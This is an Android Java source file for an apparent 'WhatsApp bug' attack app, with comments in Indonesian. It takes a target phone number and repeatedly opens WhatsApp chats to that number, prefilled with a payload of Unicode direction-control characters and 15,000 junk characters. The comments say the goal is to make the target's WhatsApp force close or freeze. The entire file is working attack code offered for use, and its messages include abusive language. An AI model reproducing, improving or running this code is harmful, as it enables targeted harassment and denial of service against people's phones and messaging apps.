package com.langz.bug;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    EditText target, delayInput;
    CheckBox waBisnis;
    Button kirim;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.activity_main);

        target = findViewById(R.id.target);
        delayInput = findViewById(R.id.delay);
        waBisnis = findViewById(R.id.wa_bisnis);
        kirim  = findViewById(R.id.kirim);

        kirim.setOnClickListener(v -> {
            String nomor = target.getText().toString().trim();
            if (nomor.isEmpty()) {
                Toast.makeText(this, "Nomor target mana bangsat?", Toast.LENGTH_SHORT).show();
                return;
            }

            long jeda = 50; // Default 50ms
            try {
                jeda = Long.parseLong(delayInput.getText().toString());
            } catch (Exception e) {}

            String paketWA = waBisnis.isChecked() ? "com.whatsapp.w4b" : "com.whatsapp";
            
            if (jeda <= 10) {
                Toast.makeText(this, "MODE BRUTAL! HP lu bisa nge-hang!", Toast.LENGTH_LONG).show();
            }

            eksekusiBug(nomor, paketWA, jeda);
        });
    }

    private void eksekusiBug(String nomor, String paketWA, long jeda) {
        Handler h = new Handler(Looper.getMainLooper());
        
        // Payload ganas: Unicode aneh + 15.000 teks sampah
        // Ini yang bikin WA target Force Close / Freeze pas buka chat
        StringBuilder sb = new StringBuilder();
        sb.append("\u202E\u202D\u202C\u200F\u200E");
        for (int i = 0; i < 15000; i++) {
            sb.append("X"); 
        }
        final String payload = sb.toString();

        Runnable r = new Runnable() {
            int count = 0;
            @Override
            public void run() {
                if (count >= 99999) { // Loop panjang
                    Toast.makeText(MainActivity.this, "Serangan selesai", Toast.LENGTH_LONG).show();
                    return;
                }
                try {
                    Intent i = new Intent(Intent.ACTION_VIEW);
                    i.setPackage(paketWA);
                    i.setData(Uri.parse("https://wa.me/" + nomor + "?text=" + Uri.encode(payload + count)));
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(i);
                } catch (Exception e) {
                    // Abaikan jika WA gagal kebuka
                }
                count++;
                h.postDelayed(this, jeda);
            }
        };
        h.post(r);
    }
                    }
